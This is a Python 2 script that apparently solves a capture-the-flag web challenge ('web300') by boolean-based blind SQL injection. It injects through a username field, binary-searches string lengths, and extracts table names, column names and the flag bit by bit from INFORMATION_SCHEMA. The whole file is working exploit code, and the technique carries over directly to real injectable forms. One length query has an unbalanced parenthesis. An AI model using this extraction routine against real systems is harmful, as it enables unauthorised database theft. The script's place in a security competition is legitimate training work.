import requests

def get(username):
	r=requests.get('http://backdoor.cognizance.org.in/problems/web300/status.php') # get cookie
	r=requests.post('http://backdoor.cognizance.org.in/problems/web300/check.php',data=dict(username=username),cookies=r.cookies)
	if r.content == 'Please wait for a little while for this user to be validated': return False
	if r.content == 'This user has been validated': return True
	if not r.content: return False # error
	return r.content

def inject(sql):
	return get("1' AND "+sql+'-- ') # escaped

def enumByte(base,byte):
	rval = ''
	template = '((ASCII(%s)>>%d)&1)=1'
	for i in xrange(7,-1,-1):
		request = base%(template%(byte,i))
		rval += '1' if inject(request) else '0'
	return int(rval,2)

def enumChar(base,byte):
	return chr(enumByte(base,byte))

def enumString(base,string,length):
	rval = ''
	template = 'SUBSTR(%s,%d,1)'
	for i in xrange(length):
		rval += enumChar(base,template%(string,i+1))
		print rval
	return rval

def getLength(query,minlen=0,maxlen=256):
	while minlen != maxlen:
		target = (maxlen+minlen)/2
		if inject(query%(minlen,target)):
			maxlen = target
		else:
			if minlen == target: return maxlen
			minlen = target
	return minlen

tlen=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND LENGTH(TABLE_NAME) BETWEEN %d AND %d)")
print 'len(table_name) =',tlen

t=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND %s)","TABLE_NAME",tlen)
print 'table_name =',t

clen=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND LENGTH(COLUMN_NAME) BETWEEN %d AND %d)")
print 'len(%s.column_name) = %d'%(t,clen)

c=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND %s)","COLUMN_NAME",clen)
print '%s.column_name = %s'%(t,c)

dlen=getLength("(SELECT LENGTH(this_column_has_the_flag) BETWEEN %d and %d FROM the_elusive_flag")
print 'len(%s.%s[0]) = %d'%(t,c,dlen)

r=enumString("(SELECT %s FROM the_elusive_flag)","this_column_has_the_flag",dlen)
print 'flag',r
